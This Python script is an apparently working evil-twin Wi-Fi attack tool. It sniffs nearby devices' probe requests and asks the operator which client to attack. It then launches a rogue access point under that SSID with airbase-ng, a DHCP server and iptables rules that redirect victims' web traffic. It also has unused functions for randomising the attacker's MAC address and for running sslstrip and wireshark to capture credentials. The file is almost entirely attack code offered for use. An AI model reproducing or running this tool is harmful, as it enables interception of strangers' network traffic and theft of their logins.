#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
try:
    from scapy.all import *
except:
    try:
        from scapy import *
    except:
        sys.exit("Error: You need to install scapy first")
        

from datetime import datetime
import threading
from types import *
from multiprocessing import Process
from subprocess import call
from subprocess import Popen
from scapy.error import Scapy_Exception
import sys
import argparse


index = {}
n = 0
internet_interface = "eth0"
monitor_interface = "wlan0mon"
ssid_to_attack = "FreeWifi" 


class Sniffing(threading.Thread):
  
    def __init__(self):
        threading.Thread.__init__(self)
    
    def run(self):
        
        try:
            def sort(pkt):
                global index
                global n
                global shutdown_event 

                if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4 and pkt.info != "" and not ((pkt.addr2,pkt.info) in index.keys()):
                    n = n+1
                    index[(pkt.addr2,pkt.info)] = n
                    signal_strength = -(256-ord(pkt.notdecoded[-4:-3]))
                    print "[" + str(n) + "] " + "%s               %s                      %s" % (pkt.addr2, pkt.info,signal_strength)
                    time.sleep(1)
                    
        except Scapy_Exception("Filter parse error"):
            print("Error: Sort function quitted")
        
        
        try:
            def stop(pkt):
                 
                packet_to_string=str(pkt)
                if packet_to_string.find("1.1.1.1"):
                    return True
                
                else:
                    return False
                
                time.sleep(1)
                
        except Scapy_Exception("Filter parse error"):
            print("Error: Stop function quitted")
            
            
        try:
            sniff(filter="", iface =monitor_interface, prn=sort, store=0, stop_filter=stop )
        except (KeyboardInterrupt, SystemExit, NameError):
            print ""

def choice():
    
    global index
    global client_to_attack
    global ssid_to_attack
    number_is_correct = False
    
    if len(index) == 0:
        print "No probe readed, exiting program"
        sys.exit()
    
    else:
        while not number_is_correct:
            number_to_attack = input("Select which # you want to attack (type a number): ")
            
            if number_to_attack in index.values():
                for tuple, number in index.items():
                    if number == number_to_attack:
                        client_to_attack,ssid_to_attack = tuple
                        number_is_correct = True
                        print "You choosed to attack Client %s with SSID %s" % (client_to_attack,ssid_to_attack)
            else:
                print "Type a number in the range (1,%s)" % (len(index))    

     
def macchanger(): #Not used for the moment

    cmd = "ifconfig {0} down ; \
            ifconfig {1} down ; \
            sleep 0.2 ; \
            macchanger -r {2} ; \
            macchanger -r {3} ; \
            sleep 0.2 ; \
            ifconfig {4} up ; \
            ifconfig {5} up".format(monitor_interface, internet_interface, monitor_interface, internet_interface, monitor_interface, internet_interface)
    try:
        retcode = call(cmd, stdout=0, shell=True)
        
        if retcode < 0:
            print >>sys.stderr, "Child was terminated by signal", -retcode
        else:
            print "Your MAC adresses have changed."
            
    except OSError as e:
        print >>sys.stderr, "Execution failed:", e



def fire_up_rogue_ap():
  
    global ssid_to_attack
    cmd_clean_iptables = 'echo "0" > /proc/sys/net/ipv4/ip_forward ; \
            iptables --flush ; \
            iptables -t nat --flush ; \
            iptables --delete-chain ; \
            iptables -t nat --delete-chain'

    try:
        retcode = call(cmd_clean_iptables, stdout=0, shell=True)

    except OSError as e:
        print >>sys.stderr, "Execution failed:", e
    

    try:
        proc_rogue_ap = subprocess.Popen(["sudo", "airbase-ng", "-v", "-c", "11", "-e", ssid_to_attack, monitor_interface])
    except OSError as e:
        print >>sys.stderr, "Execution failed:", e
        proc_rogue_ap.kill()
    except KeyboardInterrupt:
        proc_rogue_ap.kill()
    
    file = open("/etc/udhcpd.conf", 'w')
    file.write("max_leases 30\nstart 10.1.23.10\nend 10.1.23.100\ninterface at0\ndomain local\noption dns 8.8.8.8\noption subnet 255.255.255.0\noption router 10.1.23.1\nlease 7200\nlease file /tmp/udhcpd.leases")
    file.close()

    cmd_configuration_ap = 'sleep 2 ; \
    touch /tmp/udhcpd.leases ; \
    ifconfig at0 up ; \
    ifconfig at0 10.1.23.1 netmask 255.255.255.0 ; \
    echo 1 > /proc/sys/net/ipv4/ip_forward ; \
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.2.1:10000 ; \
    iptables -t nat -A POSTROUTING -o {0} -j MASQUERADE'.format(internet_interface)
    
    try:
        dhcp_server = subprocess.Popen(["udhcpd", "/etc/udhcpd.conf"])
        retcode = call(cmd_configuration_ap, stdout=0, shell=True)
    except OSError as e:
        print >>sys.stderr, "Execution failed:", e
    except KeyboardInterrupt:
        dhcp_server.kill()

def exploitation(): #Not used for the moment

    try:
        proc_iptables = subprocess.Popen(["sslstrip", "-w", "/root/Desktop/rogue.txt"])
    except OSError as e:
        print >>sys.stderr, "Execution failed:", e
        proc_iptables.kill()
    except KeyboardInterrupt:
        proc_iptables.kill()
        
        
    try:
        proc_iptables = subprocess.Popen(["wireshark", "-i", "at0", "-k", "&"])
    except OSError as e:
        print >>sys.stderr, "Execution failed:", e
        proc_iptables.kill()
    except KeyboardInterrupt:
        proc_iptables.kill()    
        

def main():
  
    global monitor_interface
    global internet_interface
    global ssid_to_attack
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--monitor_interface", help="Specify wireless interface in monitor mode (wlan0mon by default).")
    parser.add_argument("-i", "--internet_interface", help="Specify interface on which you have Internet (eth0 by default).")
    parser.add_argument("-s", "--SSID", help="No probe request reader, directly fire up the Rogue AP with the specified SSID.")
    args = parser.parse_args()
    if args.monitor_interface:
        monitor_interface = args.monitor_interface.lower() 
    if args.internet_interface:
        internet_interface = args.internet_interface.lower()
   
    if not args.SSID:
   
        print "[%s] Starting scan \n"%datetime.now()
        print " #     Mac Client                   Probe request             Signal Strength"
    
    
        try:
            while 1:
                thread1 = Sniffing()
                thread1.start()
                thread1.join(timeout=0.1)
                time.sleep(0.1)
            
        except (KeyboardInterrupt, SystemExit):
            print '\n\n! Received keyboard interrupt, quitting sniffing ! \n'
            mon_ping = Ether() / IP(src = "1.1.1.1", dst = "127.0.0.1")
            sendp(mon_ping, verbose=False)
        
        choice_correct = False
        while choice_correct is False:
            try:
                choice()
                choice_correct = True
            except (KeyboardInterrupt, SystemExit):
                print "\n\n! Received keyboard interrupt, quitting choice ! \n"
                sys.exit()
            except (SyntaxError, NameError):
                print "Type a number in the range (1,%s)" % (len(index))
       
        try:
            f = Process(target=fire_up_rogue_ap)
            f.start()
            f.join()
            time.sleep(86400)    
        except (KeyboardInterrupt, SystemExit):
            print '\n\n! Received keyboard interrupt, quitting rogue AP ! \n'
            f.terminate()
        
    else:
        ssid_to_attack = args.SSID
        try:
            p = Process(target=fire_up_rogue_ap)
            p.start()
            p.join()
            time.sleep(86400)    
        except (KeyboardInterrupt, SystemExit):
            print '\n\n! Received keyboard interrupt, quitting rogue AP ! \n'
            p.terminate()
        
       
        
    
if __name__=="__main__":
    main()                




